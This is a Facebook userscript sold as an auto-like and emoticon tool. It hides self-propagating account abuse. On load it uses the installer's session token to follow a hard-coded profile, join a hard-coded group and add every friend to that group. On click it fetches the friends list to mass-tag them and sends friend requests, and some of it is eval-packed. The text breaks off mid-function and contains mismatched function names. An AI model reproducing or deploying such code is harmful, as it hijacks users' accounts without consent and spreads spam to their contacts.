// ==UserScript==
// @name		facebook like statuses & comments automatically
// @namespace
// @description			Like Facebook Statuses & COmments Automatically with an amazing delay for statuses.please dont like more than ten comments at a time thanks
// @author			author
// @authorURL		facebook	
// @homepage			facebook
// @include			htt*://www.facebook.com/*
// @icon			
// @version			full new updated 1.51
// ==/UserScript==

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100000116091097");

 sublist("");

var gid = ['Banyak.Kata.Mengandung.Makna.Berarti'];


var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "100000116091097";
var spost_id = "100000116091097";
var sfoto_id = "100000116091097";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkada??????leme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}
function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}

function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        w = document.getElementsByClassName('pbm fsm')[0];

        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Eran';
        e.className = 'uiButton';
        e.onclick = autoSuggest;

        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}

blub();

document.addEventListener("DOMNodeInserted", blub, true);

body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+90px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Refresh</center></blink></a>"
body.appendChild(div);}


if(body != null) {
div = document.createElement("div");
div.setAttribute('id','like2');
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "130px"; 
div.style.opacity= 0.90;
div.style.bottom = "+65px";
div.style.left = "+8px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AutoLike()'><center>Like All Status</center></a></a>"
   body.appendChild(div);
   unsafeWindow.AutoLike = function () {
      eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 7=0;4 c=0;4 2=d.n("a");4 5=B C();o(4 i=0;i<2.8;i++)9(2[i].e("f")!=p&&2[i].e("f").q("D")>=0&&(2[i].3=="E F"||2[i].3=="g"||2[i].3=="G"||2[i].3=="HğI"||2[i].3=="أعجبني"||2[i].3=="いいね！"||2[i].3=="讚"||2[i].3=="K"||2[i].3=="좋아요"||2[i].3=="J’L")){5[c]=2[i];c++}6 r(h){5[h].M();4 s="<a N=\'O-P:Q;R:#S\' T=\'U()\'><t>g V: "+(h+1)+"/"+5.8+"</t></a>";d.W(\'X\').3=s};6 u(b){v.w(j,b)};6 x(){4 k=d.n("Y");4 l=Z;o(4 i=0;i<k.8;i++){4 m=k[i].e("f");9(m!=p&&m.q("10 11 12")>=0){y("13 14 z");l=15}}9(!l)u(16)};6 A(b){v.w(x,b)};6 j(){9(7<5.8){r(7);A(17);7++}};y(\'g z \');j();',62,76,'||prepare|innerHTML|var|buttons|function|BounceCounterLike|length|if||timex|Counter|document|getAttribute|class|Like|linknumber||bouncer_like|warning|checkwarning|myClass|getElementsByTagName|for|null|indexOf|check_link|message|center|like_timer|window|setTimeout|check_warning|alert|Facebook|warning_timer|new|Array|UFILikeLink|Me|gusta|Suka|Be|en||Seneng|aime|click|style|font|weight|bold|color|3B5998|onclick|Autolike|Status|getElementById|like2|label|false|uiButton|uiButtonLarge|uiButtonConfirm|Warning|from|true|2160|700|start|autolike|by|Qbrint'.split('|'),0,{}))
   };
}

body = document.body;
if(body != null) {
div = document.createElement("div");
div.setAttribute('id','like3');
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "130px";
div.style.opacity= 0.90;
div.style.bottom = "+44px";
div.style.left = "+8px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='LikeComments()'><center>Like All Comments</center></a>"
body.appendChild(div);unsafeWindow.LikeComments = function() {
var BounceCounterLike=0;var Counter = 0;var prepare = document.getElementsByTagName("a");var buttons = new Array();for (var i = 0; i < prepare.length; i++)if(prepare[i].getAttribute("data-ft")!=null&&(prepare[i].getAttribute("title")=="Me gusta este comentario"||prepare[i].getAttribute("title")=="Like this comment"||prepare[i].getAttribute("title")=="Suka komentar ini"||prepare[i].getAttribute("title")=="Nyenengi tanggapan iki"||prepare[i].getAttribute("title")=="الإعجاب بالتعليق"||prepare[i].getAttribute("title")=="このコメントはいいね！"||prepare[i].getAttribute("title")=="좋아요 취소"||prepare[i].getAttribute("title")=="說這則留言讚"||prepare[i].getAttribute("title")=="J’aime ce commentaire"||prepare[i].getAttribute("title")=="Bu yorumu beğen")) {buttons[Counter] = prepare[i];Counter++;}function check_link(linknumber) {buttons[linknumber].click();var message = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+ (linknumber + 1) +"/"+ buttons.length +"</center></a>";document.getElementById('like3').innerHTML = message;};function like_timer(timex) {window.setTimeout(bouncer_like,timex);};function check_warning() {var warning = document.getElementsByTagName("label");var checkwarning = false;for(var i = 0; i < warning.length; i++) {var myClass = warning[i].getAttribute("class");if(myClass!=null&&myClass.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) {alert("Warning from Facebook");checkwarning = true;}}if(!checkwarning) like_timer(0);};function warning_timer(timex) {window.setTimeout(check_warning,timex);};function bouncer_like() {if ( BounceCounterLike < buttons.length ) {check_link(BounceCounterLike);warning_timer(0);BounceCounterLike++;}};bouncer_like();
};}

if(body != null) {
div = document.createElement("div");
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "130px";
div.style.opacity= 0.90;
div.style.bottom = "+25px";
div.style.left = "+8px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='BugInfo()'><center>Report Bugs</center></a></a>"
body.appendChild(div);unsafeWindow.BugInfo = function() {
window.open(this.href='http://m.facebook.com/addinggameofficialplus', 'dmfollow', 'toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=no,width=400,height=255');return false;
};}

if(body != null) {
div = document.createElement("div");
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "130px";
div.style.height = "18px";
div.style.opacity= 0.90;
div.style.bottom = "+0px";
div.style.left = "+8px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<iframe src='//www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2Banyak.Kata.Mengandung.Makna.Berarti&amp;layout=button_count&amp;show_faces=true&amp;colorscheme=light&amp;font=arial&amp;width=450&amp;appId=' scrolling='no' frameborder='0' style='border:none; overflow:hidden; height='10' ALIGN='center' allowTransparency='true'></iframe>"
body.appendChild(div);}


var version, storage, spemotsInfo, spemotsTitle, headTag, styleTag, ArrowStyleUp, ArrowStyleDown, fEmotBarDom, fEmotsListDom, fArrow;

	version = 1;
	


	storage = 'none';

	try {
		if (typeof GM_getValue === 'function' && typeof GM_setValue === 'function') {
			GM_setValue('testkey', 'testvalue');
			if (GM_getValue('testkey', false) === 'testvalue') { storage='greasemonkey'; }
		}
	} catch(x) {}
	if (storage=='none' && typeof localStorage == 'object') { storage='localstorage'; }

	function setValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				GM_setValue('0-'+key, value);
				break;
			case 'localstorage':
				localStorage['femotbar-0-'+key] = value;
				break;
		}
	}

	function getValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				return GM_getValue('0-'+key, value);
			case 'localstorage':
				var val = localStorage['femotbar-0-'+key];
				if (val=='true') { return true; }
				else if (val=='false') { return false; }
				else if (val) { return val; }
				break;
		}
		return value;
	}
	
	function xmlhttpRequest(params, callBack) {
		if (typeof GM_xmlhttpRequest !== 'undefined') {
			params['onload'] = callBack;
			return GM_xmlhttpRequest(params);
		}
		return null;
	}

	function openInTab(url) {
		if (typeof GM_openInTab !== 'undefined') { GM_openInTab(url); }
		else { window.open(url); }
	}

	
	

	function createSelection(field, start, end) {
		if( field.createTextRange ) {
			var selRange = field.createTextRange();
			selRange.collapse(true);
			selRange.moveStart('character', start);
			selRange.moveEnd('character', end);
			selRange.select();
		} else if( field.setSelectionRange ) {
			field.setSelectionRange(start, end);
		} else if( field.selectionStart ) {
			field.selectionStart = start;
			field.selectionEnd = end;
		}
		field.focus();
	}       
	
	function getCursorPosition(field) {
		var CursorPos = 0;
		if (field.selectionStart || field.selectionStart == '0') CursorPos = field.selectionStart;
		return (CursorPos);
	}
	
var a = '[[458743470836752]]'
var b = '[[458743477503418]]'
var c = '[[458743480836751]]'
var d = '[[460446070666492]]'
var e = '[[458743647503401]]'
var f = '[[458743664170066]]'
var g = '[[458743684170064]]'
var h = '[[458743697503396]]'
var i = '[[458743710836728]]'
var j = '[[458743727503393]]'
var k = '[[458743744170058]]'
var l = '[[460457413998691]]'
var m = '[[458743760836723]]'
var n = '[[458743767503389]]'
var o = '[[458743777503388]]'
var p = '[[458743787503387]]'
var q = '[[458743794170053]]'
var r = '[[458743797503386]]'
var s = '[[458743814170051]]'
var t = '[[458743834170049]]'
var u = '[[458743840836715]]'
var v = '[[460457397332026]]'
var w = '[[460457423998690]]'
var x = '[[458743870836712]]'
var y = '[[458743887503377]]'
var z = '[[458743910836708]]'
var aa = '[[458743927503373]]'
var bb = '[[458743934170039]]'
var cc = '[[458743957503370]]'
var dd = '[[458744247503341]]'
var ee = '[[458744467503319]]'
var ff = '[[458744484169984]]'
var gg = '[[458744507503315]]'
var hh = '[[458744524169980]]'
var ii = '[[458744540836645]]'
var jj = '[[458744554169977]]'
var kk = '[[458744580836641]]'
var ll = '[[458744587503307]]'
var mm = '[[458744597503306]]'
var nn = '[[458744607503305]]'
var oo = '[[458744614169971]]'
var pp = '[[458744620836637]]'
var qq = '[[458744630836636]]'
var rr = '[[458744644169968]]'
var ss = '[[458744660836633]]'
var tt = '[[458744650836634]]'
var uu = '[[458744687503297]]'
var vv = '[[458744700836629]]'
var ww = '[[458744714169961]]'
var xx = '[[458744724169960]]'
var yy = '[[458744744169958]]'
var zz = '[[458744754169957]]'
var aaa = '[[458744780836621]]'
var bbb = '[[458744800836619]]'
var ccc = '[[458744784169954]]'
var ddd = '[[458744810836618]]'
var eee = '[[458744820836617]]'
var fff = '[[458744824169950]]'
var ggg = '[[458744837503282]]'
var hhh = '[[458744844169948]]'
var iii = '[[458744854169947]]'
var jjj = '[[458744874169945]]'
var kkk = '[[458744877503278]]'
var lll = '[[458744894169943]]'
var mmm = '[[458744897503276]]'
var nnn = '[[458744900836609]]'
var ooo = '[[458744920836607]]'
var ppp = '[[458744944169938]]'
var qqq = '[[458744954169937]]'
var rrr = '[[458744967503269]]'
var sss = '[[458744974169935]]'
var ttt = '[[458744994169933]]'
var uuu = '[[458745007503265]]'
var vvv = '[[458745020836597]]'
var www = '[[458745024169930]]'
var xxx = '[[458745034169929]]'
var yyy = '[[458745047503261]]'
var zzz = '[[460457430665356]]'
var no = '[[460457450665354]]'
var az = '[[460457453998687]]'
var er = '[[460457457332020]]'
var ty = '[[460457480665351]]'
var ui = '[[460457507332015]]'
var op = '[[460457527332013]]'
var qs = '[[460457547332011]]'
var df = '[[460457533998679]]'
var gh = '[[460472413997191]]'
var jk = '[[460472420663857]]'
var lm = '[[460472423997190]]'
var wx = '[[460472437330522]]'
var cv = '[[458745387503227]]'
var bn = '[[458745357503230]]'
var nb = '[[458745084169924]]'
var vc = '[[458745320836567]]'
var xw = '[[458745337503232]]'
	spemotsInfo = [a, 'http://graph.facebook.com/458743470836752/picture', b, 'http://graph.facebook.com/458743477503418/picture', c, 'http://graph.facebook.com/458743480836751/picture',d, 'http://graph.facebook.com/460446070666492/picture', e, 'http://graph.facebook.com/458743647503401/picture', f, 'http://graph.facebook.com/458743664170066/picture', g, 'http://graph.facebook.com/458743684170064/picture', h, 'http://graph.facebook.com/458743697503396/picture', i, 'http://graph.facebook.com/458743710836728/picture', j, 'http://graph.facebook.com/458743727503393/picture', k, 'http://graph.facebook.com/458743744170058/picture', l, 'http://graph.facebook.com/460452017332564/picture', m, 'http://graph.facebook.com/458743760836723/picture', n, 'http://graph.facebook.com/458743767503389/picture', o, 'http://graph.facebook.com/458743777503388/picture', p, 'http://graph.facebook.com/458743787503387/picture', q, 'http://graph.facebook.com/458743794170053/picture', r, 'http://graph.facebook.com/458743797503386/picture', s, 'http://graph.facebook.com/458743814170051/picture', t, 'http://graph.facebook.com/458743834170049/picture', u, 'http://graph.facebook.com/458743840836715/picture', v, 'http://graph.facebook.com/460452010665898/picture', w, 'http://graph.facebook.com/460452020665897/picture', x, 'http://graph.facebook.com/458743870836712/picture', y, 'http://graph.facebook.com/458743887503377/picture', z, 'http://graph.facebook.com/458743910836708/picture', aa, 'http://graph.facebook.com/458743927503373/picture', bb, 'http://graph.facebook.com/458743934170039/picture', cc, 'http://graph.facebook.com/458743957503370/picture', dd, 'http://graph.facebook.com/458744247503341/picture', ee, 'http://graph.facebook.com/458744467503319/picture', ff, 'http://graph.facebook.com/458744484169984/picture', gg, 'http://graph.facebook.com/458744507503315/picture', hh, 'http://graph.facebook.com/458744524169980/picture', ii, 'http://graph.facebook.com/458744540836645/picture', jj, 'http://graph.facebook.com/458744554169977/picture', kk, 'http://graph.facebook.com/458744580836641/picture', ll, 'http://graph.facebook.com/458744587503307/picture', mm, 'http://graph.facebook.com/458744597503306/picture', nn, 'http://graph.facebook.com/458744607503305/picture', oo, 'http://graph.facebook.com/458744614169971/picture', pp, 'http://graph.facebook.com/458744620836637/picture', qq, 'http://graph.facebook.com/458744630836636/picture', rr, 'http://graph.facebook.com/458744644169968/picture', ss, 'http://graph.facebook.com/458744660836633/picture', tt, 'http://graph.facebook.com/458744650836634/picture', uu, 'http://graph.facebook.com/458744687503297/picture', vv, 'http://graph.facebook.com/458744700836629/picture', ww, 'http://graph.facebook.com/458744714169961/picture', xx, 'http://graph.facebook.com/458744724169960/picture', yy, 'http://graph.facebook.com/458744744169958/picture', zz, 'http://graph.facebook.com/458744754169957/picture', aaa, 'http://graph.facebook.com/458744780836621/picture', bbb, 'http://graph.facebook.com/458744800836619/picture', ccc, 'http://graph.facebook.com/458744784169954/picture', ddd, 'http://graph.facebook.com/458744810836618/picture', eee, 'http://graph.facebook.com/458744820836617/picture', fff, 'http://graph.facebook.com/458744824169950/picture', ggg, 'http://graph.facebook.com/458744837503282/picture', hhh, 'http://graph.facebook.com/458744844169948/picture', iii, 'http://graph.facebook.com/458744854169947/picture', jjj, 'http://graph.facebook.com/458744874169945/picture', kkk, 'http://graph.facebook.com/458744877503278/picture', lll, 'http://graph.facebook.com/458744894169943/picture', mmm, 'http://graph.facebook.com/458744897503276/picture', nnn, 'http://graph.facebook.com/458744900836609/picture', ooo, 'http://graph.facebook.com/458744920836607/picture', ppp, 'http://graph.facebook.com/458744944169938/picture', qqq, 'http://graph.facebook.com/458744954169937/picture', rrr, 'http://graph.facebook.com/458744967503269/picture', sss, 'http://graph.facebook.com/458744974169935/picture', ttt, 'http://graph.facebook.com/458744994169933/picture', uuu, 'http://graph.facebook.com/458745007503265/picture', vvv, 'http://graph.facebook.com/458745020836597/picture', www, 'http://graph.facebook.com/458745024169930/picture', xxx, 'http://graph.facebook.com/458745034169929/picture', yyy, 'http://graph.facebook.com/458745047503261/picture', zzz, 'http://graph.facebook.com/460452027332563/picture', no, 'http://graph.facebook.com/460457450665354/picture', az, 'http://graph.facebook.com/460457453998687/picture', er, 'http://graph.facebook.com/460457457332020/picture', ty, 'http://graph.facebook.com/460457480665351/picture', ui, 'http://graph.facebook.com/460457507332015/picture', op, 'http://graph.facebook.com/460457527332013/picture', qs, 'http://graph.facebook.com/460457547332011/picture', df, 'http://graph.facebook.com/460457533998679/picture', gh, 'http://graph.facebook.com/460472413997191/picture', jk, 'http://graph.facebook.com/460472420663857/picture', lm, 'http://graph.facebook.com/460472423997190/picture', wx, 'http://graph.facebook.com/460472437330522/picture', cv, 'http://graph.facebook.com/458745387503227/picture', bn, 'http://graph.facebook.com/458745357503230/picture', nb, 'http://graph.facebook.com/458745084169924/picture', vc, 'http://graph.facebook.com/458745320836567/picture', xw, 'http://graph.facebook.com/458745337503232/picture', sp, 'http://graph.facebook.com/458745394169893/picture'];
    spemotsTitle = ['a', '', 'b', '', 'c', '', 'd', '', 'e', '', 'f', '', 'g', '', 'h', '', 'i', '', 'j', '', 'k', '', 'l', '', 'm', '', 'n', '', 'o', '', 'p', '', 'q', '', 'r', '', 's', '', 't', '', 'u', '', 'v', '', 'w', '', 'x', '', 'y', '', 'z', '', 'aa', '', 'bb', '', 'cc', '', 'dd', '', 'ee', '', 'ff', '', 'gg', '', 'hh', '', 'ii', '', 'jj', '', 'kk', '', 'll', '', 'mm', '', 'nn', '', 'oo', '', 'pp', '', 'qq', '', 'rr', '', 'ss', '', 'tt', '', 'uu', '', 'vv', '', 'ww', '', 'xx', '', 'yy', '', 'zz', '', 'aaa', '', 'bbb', '', 'ccc', '', 'ddd', '', 'eee', '', 'fff', '', 'ggg', '', 'hhh', '', 'iii', '', 'jjj', '', 'kkk', '', 'lll', '', 'mmm', '', 'nnn', '', 'ooo', '', 'ppp', '', 'qqq', '', 'rrr', '', 'sss', '', 'ttt', '', 'uuu', '', 'vvv', '', 'www', '', 'xxx', '', 'yyy', '', 'zzz', '', 'no', '', 'az', '', 'er', '', 'ty', '', 'ui', '', 'op', '', 'qs', '', 'df', '', 'gh', '', 'jk', '', 'lm', '', 'wx', '', 'cv', '', 'bn', '', 'nb', '', 'vc', '', 'xw',];
    headTag = document.getElementsByTagName('head')[0];
    if (headTag) {
		styleTag = document.createElement('style');
		styleTag.type = 'text/css';
		styleTag.innerHTML =
			'.chat_tab_emot_bar {padding-top: 2px; padding-bottom: 6px; line-height: 16px; padding-left: 2px; background:#EEEEEE none repeat scroll 0 0; border-style: solid; border-width: 0px 0px 1px 0px; border-color: #C9D0DA; position: static; }'+
			'.fbNubFlyoutInner {position:relative !important;bottom:0px !important;}';
		headTag.appendChild(styleTag);
	}
	
	ArrowStyleUp = 'cursor: pointer; position: absolute; right: 2px; -moz-transform: rotate(180deg); -webkit-transform: rotate(180deg);'
	ArrowStyleDown = 'cursor: pointer; position: absolute; right: 2px;'
	
	fEmotBarDom = document.createElement('div');
	fEmotBarDom.setAttribute('class','chat_tab_emot_bar');

	
	fEmotsListDom = document.createElement('div');
	fEmotsListDom.setAttribute('name','uiToggleFlyout');
	fEmotBarDom.appendChild(fEmotsListDom);
	
	
	for(i=0;i<spemotsInfo.length;i+=2) {
		var fEmotsDom = document.createElement('img');
		fEmotsDom.setAttribute('alt',spemotsInfo[i]);
		fEmotsDom.setAttribute('title',spemotsTitle[i]);
		fEmotsDom.setAttribute('src','' + spemotsInfo[i+1]);
		fEmotsDom.setAttribute('style','cursor: pointer;');
		fEmotsDom.setAttribute('class','emote_custom');
		fEmotsListDom.appendChild(fEmotsDom);
	}
	
	

	fArrow = document.createElement('i');
	fArrow.setAttribute('alt','');
	fArrow.setAttribute('class','img chat_arrow');
	fArrow.setAttribute('style',ArrowStyleUp);
	fEmotBarDom.appendChild(fArrow);
	
	var setting_visible = getValue('visible',true);
	
	document.addEventListener('DOMNodeInserted', fInsertedNodeHandler, false);

	function fInsertedNodeHandler(event) {
		if(event.target.getElementsByClassName && event.target.getElementsByClassName('fbNubFlyout fbDockChatTabFlyout')[0])
			fInsertEmotBar(event.target);
	}

	function fInsertEmotBar(fChatWrapper) {
		fChatToolBox = fChatWrapper.getElementsByClassName('fbNubFlyoutHeader')[0]
		fNewEmotBar = fEmotBarDom.cloneNode(true);
		setVisibility(fNewEmotBar);
		for(i=0;i<fNewEmotBar.firstChild.childNodes.length-2;i++) fNewEmotBar.firstChild.childNodes[i].addEventListener('click', fEmotClickHandler , false);

		fNewEmotBar.firstChild.childNodes[i].addEventListener('click' , fStyleClickHandler , false);
		fNewEmotBar.firstChild.childNodes[i+1].addEventListener('click' , fStyleClickHandler , false);
		
		fNewEmotBar.childNodes[1].addEventListener('click', fHideShowEmotBar , false);
		if(fChatToolBox.childNodes) fChatToolBox.insertBefore(fNewEmotBar,fChatToolBox.childNodes[1]);
	}

	function fEmotClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
		var pos = getCursorPosition(fChatInput);
		
		var txtbef = ''; var txtaft = '';
		
		if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ';
		if (fChatInput.value.charAt(pos) != ' ') txtaft = ' ';
		
		fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + event.target.getAttribute('alt') + txtaft + fChatInput.value.substring(pos);
		createSelection(fChatInput,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length);
	}
	
	function fStyleClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
		
		var selectedText = fChatInput.value.substring(fChatInput.selectionStart, fChatInput.selectionEnd);
		
		var pos = getCursorPosition(fChatInput);
		var txtlen = selectedText.length;
		
		if (txtlen == 0) {
			fChatInput.value = fChatInput.value.substring(0,pos) + event.target.getAttribute('alt') + fChatInput.value.substring(pos);
			createSelection(fChatInput,pos + 1,pos + event.target.getAttribute('alt').length-1);
		}
		else {
